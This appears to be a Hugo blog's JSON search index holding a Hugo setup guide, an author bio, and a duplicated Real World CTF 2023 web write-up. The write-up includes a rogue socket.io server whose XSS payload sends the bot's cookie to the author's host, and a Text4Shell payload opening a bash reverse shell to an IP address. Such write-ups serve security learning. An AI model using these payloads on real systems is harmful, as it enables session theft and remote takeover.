[{"authors":[],"categories":[],"content":"hugo的简单使用\r安装\r安装选择官方推荐的巧克力(Chocolatey)\nChocolatey安装\r1Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(\u0026#39;https://community.chocolatey.org/install.ps1\u0026#39;)) PS: 前置条件：运行Get-ExecutionPolicy。如果返回Restricted，则运行Set-ExecutionPolicy AllSigned或Set-ExecutionPolicy Bypass -Scope Process。\n安装GOLANG\r使用choco install golang -y\n安装hugo扩展\r使用choco install hugo-extended\n安装hugo\r设置go的代理 go env -w GOPROXY=https://goproxy.cn,direct 安装hugo源码 go env -w GOPROXY=https://goproxy.cn,direct 命令行环境\r二者选一\npowershell\r这个powershell和你本机的可能不一样，如何测试？\n1echo 123 \u0026gt;\u0026gt; 123.txt 2cat 123.txt 应该能看到在命令能看到读取到的123 否则就点击Fetching Title#lyss 进行安装\ngit bash\rgit bash的安装资料很多了，这里就不列出了 建立站点\r在博客的文件夹（最好自己找个地方建立一下）在这个目录打开命令行 建立一个example\r1hugo new site quickstart #这是网站名称，会在当前目录建立一个同名文件夹 2cd quickstart 3git init 4git submodule add https://github.com/theNewDynamic/gohugo-theme-ananke themes/ananke#这是从github获取主题 5echo \u0026#34;theme = \u0026#39;ananke\u0026#39;\u0026#34; \u0026gt;\u0026gt; config.toml#设置配置文件，指定主题为ananke，但如果你的powershell出现问题，那就手动去修改这个 6hugo server 如果遇到编码问题导致hugo server运行失败，那就用vs code打开然后保存为UTF-8,之后的配置修改就在vs code里改就好了。 运行成功应该如下\n访问localhost:1313应该得到了如下的界面 添加一个页面\r使用命令hugo new post/xxx.md 这里我建立一个markdown 然后在content/posts下会生成这个文件，对其进行编辑然后保存\n接着我们再次打开服务，使用hugo server -D 切换主题\r随便找了个主题 然后切换到theme目录cd theme 安装主题 git submodule add https://github.com/razonyang/hugo-theme-bootstrap themes/hugo-theme-bootstrap 该主题需要一个临时文件夹 git clone https://github.com/razonyang/hugo-theme-bootstrap-skeleton tmp/hbs-skeleton 然后拷贝文件到相应目录 cp -a tmp/hbs-skeleton/config/* ./config cp -r tmp/hbs-skeleton/content/* ./content cp -r tmp/hbs-skeleton/archetypes/* ./archetypes cp -r tmp/hbs-skeleton/static/* ./static cp -r tmp/hbs-skeleton/* ./assets\n然后执行hugo mod npm pack 修改config.toml里的theme参数 然后安装npm choco install nodejs.install 安装后执行npm install\n再次启动服务器 接着就是修改相关配置，这个主题的文档很齐全小部件 - Hugo Bootstrap\n发布\r生成静态文件\rhugo -d docs 然后参照如何使用Hugo在GitHub Pages上搭建免费个人网站 - 知乎就行\n创建Github-pages\r以这里注册的新github为例子，创建名为githubid.github.io的仓库 即 eg1o.github.io 然后到docs目录下\n1git init 2git remote add origin https://github.com/Nianze/personal-site.git 3git add . 4git commit -m \u0026#34;first commit\u0026#34; 5git fetch origin # 拉取 github 项目 6git push --set-upstream origin master ","date":"March 9, 2023","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blog/hugo/","series":[],"smallImg":"","tags":[],"timestamp":1678299387,"title":"Hugo搭建"},{"authors":[],"categories":[],"content":"rwctf 部分wp\nchatwuu\r基于ws的聊天室，有后台bot，仅可以向bot提交聊天室的url，flag在bot的cookie里。\nevil connect\r在 index.html中\n1let query = new URLSearchParams(location.search), 2 nickname = query.get(\u0026#39;nickname\u0026#39;), 3 room = query.get(\u0026#39;room\u0026#39;); 4 if (!nickname || !room) { 5 reset(); 6 } 7 for (let k of query.keys()) { 8 if (![\u0026#39;nickname\u0026#39;, \u0026#39;room\u0026#39;].includes(k)) { 9 reset(); 10 } 11 } 12 document.title += \u0026#39; - \u0026#39; + room; 13 let socket = io(`/${location.search}`), 14 messages = document.getElementById(\u0026#39;messages\u0026#39;), 15 form = document.getElementById(\u0026#39;form\u0026#39;), 16 input = document.getElementById(\u0026#39;input\u0026#39;); 主要的代码就是这里\n1let socket = io(`/${location.search}`) 其本意是让浏览器向server发起ws连接，但因为这个的参数内容可控 与绕过ssrf一些域名检测的方法类似，使用xxx@host来绕过 即可以收到来自客户端的请求\n这个时候，说明我们可以控制客户端连接的chat server\nDOMPurify\r默认有两个房间，一个textContent，没办法执行，但DOMPurify可以\n1 if (room === \u0026#39;DOMPurify\u0026#39;) { 2 io.to(room).emit(\u0026#39;msg\u0026#39;, { 3 from: DOMPurify.sanitize(msg.from), 4 text: DOMPurify.sanitize(msg.text), 5 isHtml: true 6 }); 可以看到isHtml为true 但是这里使用了DOMPurify来过滤危险的html代码，所以第一时间想到的考点是对DOMPurify的过滤 但其实并不是，我们执行要让客户端连接我们的恶意server就可以绕过该限制\n思路\r通过提交一个特殊参数的url，使bot在访问聊天室的时候，聊天室连接的服务器为我们的恶意服务器，即 http://xxxxx:58000/?room=DOMPurify\u0026amp;nickname=r1gelx@xx.rigelx.top:43919 这里控制nickname 使得客户端连接我们的恶意服务器，以便于我们发送不经过DOMPurify的payload。然后通过DOMPurify的房间得到了为true的isHtml参数，于是在客户端会把拿到的payload当作html执行。 过程就是，提交恶意参数，使bot访问题目可执行html和js的聊天室，然后经过location.serach访问到恶意的chat服务器，由服务器向客户端返回恶意代码，然后在客户端执行，外带cookie\nevil server\r因为CORS的原因，所以不能简单的修改题目代码 修改CORS\n1const cors = require(\u0026#39;cors\u0026#39;) 2const cors_options = { 3\torigin: \u0026#34;*\u0026#34; 4\toptionsSuccessStatus: 200 5} 完整代码\n1const app = require(\u0026#39;express\u0026#39;)(); 2const http = require(\u0026#39;http\u0026#39;).Server(app) 3const cors = require(\u0026#39;cors\u0026#39;) 4 5const io = require(\u0026#39;socket.io\u0026#39;)(http,{ 6cors: { 7\torigin: \u0026#34;*\u0026#34; 8} 9}) 10 11const cors_options = { 12\torigin: \u0026#34;*\u0026#34;, 13\toptionsSuccessStatus: 200 14} 15 16app.get(\u0026#39;/\u0026#39;,cors(cors_options),(req, res)=\u0026gt;{ 17\tconsole.log(req.query) 18}); 19 20io.on(\u0026#39;connection\u0026#39;,(socket)=\u0026gt;{ 21\tconsole.log(\u0026#34;connect ok\u0026#34;) 22\tlet {room} = socket.handshake.query; 23\tsocket.join(room); 24\tio.to(room).emit(\u0026#39;msg\u0026#39;, { 25\tfrom: \u0026#39;R1gelX\u0026#39;, 26\ttext: \u0026#39;\u0026lt;img src=x onerror=\u0026#34;document.location=\\\u0026#39;http://x.rigelx.top:43919/?\\\u0026#39;+document.cookie;\u0026#34;\u0026gt;\u0026#39;, 27\tisHtml: true 28\t}); 29}); 30const hostname = \u0026#39;0.0.0.0\u0026#39;; 31const port = 43919; 32http.listen(port, hostname,()=\u0026gt;{ 33\tconsole.log(`ChatUWU malicious server running at http://${hostname}:${port}/`); 34}) 即可在监听端接收到flag 提交即可\nBe-a-Language-Expert\rthinkphp6的多语言模块包含，先包含pearcmd往tmp下写马子，然后再包含执行\nApacheCommandText\rtext4shell；过滤了 script file url dns 利用base64Decoder去绕过 反弹shell失败，是runtime.exec()的问题 所以payload：\n1${script:javascript:java.lang.Runtime.getRuntime().exec(\u0026#34;bash -c $@|bash 0 echo bash -i \u0026gt;\u0026amp; /dev/tcp/49.235.109.5/8898 0\u0026gt;\u0026amp;1\u0026#34;);} 然后base64后放入${base64Decoder:xxxx} 就行了。\n","date":"March 9, 2023","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blog/rwctf_wp/","series":[],"smallImg":"","tags":[],"timestamp":1678299387,"title":"Rwctf_wp"},{"authors":[],"categories":[],"content":"rwctf 部分wp\nchatwuu\r基于ws的聊天室，有后台bot，仅可以向bot提交聊天室的url，flag在bot的cookie里。\nevil connect\r在 index.html中\n1let query = new URLSearchParams(location.search), 2 nickname = query.get(\u0026#39;nickname\u0026#39;), 3 room = query.get(\u0026#39;room\u0026#39;); 4 if (!nickname || !room) { 5 reset(); 6 } 7 for (let k of query.keys()) { 8 if (![\u0026#39;nickname\u0026#39;, \u0026#39;room\u0026#39;].includes(k)) { 9 reset(); 10 } 11 } 12 document.title += \u0026#39; - \u0026#39; + room; 13 let socket = io(`/${location.search}`), 14 messages = document.getElementById(\u0026#39;messages\u0026#39;), 15 form = document.getElementById(\u0026#39;form\u0026#39;), 16 input = document.getElementById(\u0026#39;input\u0026#39;); 主要的代码就是这里\n1let socket = io(`/${location.search}`) 其本意是让浏览器向server发起ws连接，但因为这个的参数内容可控 与绕过ssrf一些域名检测的方法类似，使用xxx@host来绕过 即可以收到来自客户端的请求\n这个时候，说明我们可以控制客户端连接的chat server\nDOMPurify\r默认有两个房间，一个textContent，没办法执行，但DOMPurify可以\n1 if (room === \u0026#39;DOMPurify\u0026#39;) { 2 io.to(room).emit(\u0026#39;msg\u0026#39;, { 3 from: DOMPurify.sanitize(msg.from), 4 text: DOMPurify.sanitize(msg.text), 5 isHtml: true 6 }); 可以看到isHtml为true 但是这里使用了DOMPurify来过滤危险的html代码，所以第一时间想到的考点是对DOMPurify的过滤 但其实并不是，我们执行要让客户端连接我们的恶意server就可以绕过该限制\n思路\r通过提交一个特殊参数的url，使bot在访问聊天室的时候，聊天室连接的服务器为我们的恶意服务器，即 http://xxxxx:58000/?room=DOMPurify\u0026amp;nickname=r1gelx@xx.rigelx.top:43919 这里控制nickname 使得客户端连接我们的恶意服务器，以便于我们发送不经过DOMPurify的payload。然后通过DOMPurify的房间得到了为true的isHtml参数，于是在客户端会把拿到的payload当作html执行。 过程就是，提交恶意参数，使bot访问题目可执行html和js的聊天室，然后经过location.serach访问到恶意的chat服务器，由服务器向客户端返回恶意代码，然后在客户端执行，外带cookie\nevil server\r因为CORS的原因，所以不能简单的修改题目代码 修改CORS\n1const cors = require(\u0026#39;cors\u0026#39;) 2const cors_options = { 3\torigin: \u0026#34;*\u0026#34; 4\toptionsSuccessStatus: 200 5} 完整代码\n1const app = require(\u0026#39;express\u0026#39;)(); 2const http = require(\u0026#39;http\u0026#39;).Server(app) 3const cors = require(\u0026#39;cors\u0026#39;) 4 5const io = require(\u0026#39;socket.io\u0026#39;)(http,{ 6cors: { 7\torigin: \u0026#34;*\u0026#34; 8} 9}) 10 11const cors_options = { 12\torigin: \u0026#34;*\u0026#34;, 13\toptionsSuccessStatus: 200 14} 15 16app.get(\u0026#39;/\u0026#39;,cors(cors_options),(req, res)=\u0026gt;{ 17\tconsole.log(req.query) 18}); 19 20io.on(\u0026#39;connection\u0026#39;,(socket)=\u0026gt;{ 21\tconsole.log(\u0026#34;connect ok\u0026#34;) 22\tlet {room} = socket.handshake.query; 23\tsocket.join(room); 24\tio.to(room).emit(\u0026#39;msg\u0026#39;, { 25\tfrom: \u0026#39;R1gelX\u0026#39;, 26\ttext: \u0026#39;\u0026lt;img src=x onerror=\u0026#34;document.location=\\\u0026#39;http://x.rigelx.top:43919/?\\\u0026#39;+document.cookie;\u0026#34;\u0026gt;\u0026#39;, 27\tisHtml: true 28\t}); 29}); 30const hostname = \u0026#39;0.0.0.0\u0026#39;; 31const port = 43919; 32http.listen(port, hostname,()=\u0026gt;{ 33\tconsole.log(`ChatUWU malicious server running at http://${hostname}:${port}/`); 34}) 即可在监听端接收到flag 提交即可\nBe-a-Language-Expert\rthinkphp6的多语言模块包含，先包含pearcmd往tmp下写马子，然后再包含执行\nApacheCommandText\rtext4shell；过滤了 script file url dns 利用base64Decoder去绕过 反弹shell失败，是runtime.exec()的问题 所以payload：\n1${script:javascript:java.lang.Runtime.getRuntime().exec(\u0026#34;bash -c $@|bash 0 echo bash -i \u0026gt;\u0026amp; /dev/tcp/49.235.109.5/8898 0\u0026gt;\u0026amp;1\u0026#34;);} 然后base64后放入${base64Decoder:xxxx} 就行了。\n","date":"March 9, 2023","img":"","lang":"en","langName":"","largeImg":"","permalink":"/posts/rwctf_wp/","series":[],"smallImg":"","tags":[],"timestamp":1678299387,"title":"Rwctf_wp"},{"authors":[],"categories":[],"content":"\rR1gelx@Syclover\rAbout Me\r[Security]\r三叶草WEB核心成员\n三叶草20届WEB负责人\nCUIT信息安全本科在读\n联系：r1gelx@outlook.com\n@极安至信（成都）科技有限公司\n[Favorite]\r半吊子安全爱好者\n免费野营爱好者\nCOD19_noob_Player\n","date":"January 1, 1","img":"","lang":"en","langName":"","largeImg":"","permalink":"/about/","series":[],"smallImg":"","tags":[],"timestamp":-62135596800,"title":"About"},{"authors":[],"categories":[],"content":"","date":"January 1, 1","img":"","lang":"en","langName":"","largeImg":"","permalink":"/contact/","series":[],"smallImg":"","tags":[],"timestamp":-62135596800,"title":"Contact Us"},{"authors":[],"categories":[],"content":"","date":"January 1, 1","img":"","lang":"en","langName":"","largeImg":"","permalink":"/offline/","series":[],"smallImg":"","tags":[],"timestamp":-62135596800,"title":"Offline"}]
